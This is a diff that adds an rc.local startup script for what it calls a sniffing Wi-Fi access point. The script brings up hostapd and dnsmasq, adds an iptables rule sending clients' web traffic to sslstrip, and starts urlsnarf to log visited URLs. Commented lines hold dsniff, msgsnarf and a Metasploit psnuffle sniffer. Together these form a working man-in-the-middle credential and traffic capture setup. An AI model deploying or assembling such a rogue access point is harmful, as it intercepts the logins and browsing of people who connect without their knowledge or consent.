@@ -1,0 +1,40 @@
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+
+/usr/local/bin/simple_forwarding.sh
+
+#Sniffing Wifi Ap setup
+echo "restarting dnsmasq"
+/etc/init.d/dnsmasq restart
+echo "restarting hostapd"
+/etc/init.d/hostapd restart
+echo "restarting ntp"
+/etc/init.d/ntp restart
+
+#sslstrip
+echo "starting sslstrip"
+iptables -t nat -A PREROUTING -s 192.168.3.0/24 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+/usr/local/bin/sslstrip_rotate.sh
+
+#dsniff
+#nice -n 10 dsniff -m -i wlan0  -w /var/log/dsniffed &
+echo "starting urlsnarf"
+nice -n 10 urlsnarf -i wlan0 >> /var/log/urlsnarf &
+#nice -n 15 msgsnarf -i wlan0 >> /var/log/msgsnarf &
+
+# nice -n 10 msfconsole -r /root/psnuffle.rc -o /var/log/msfconsole 2>&1 >> /var/log/psnuffle &
+echo "starting indyn"
+nice -n 15 inadyn
+echo "updating adblock file"
+/usr/local/bin/adblock_update.sh
+exit 0
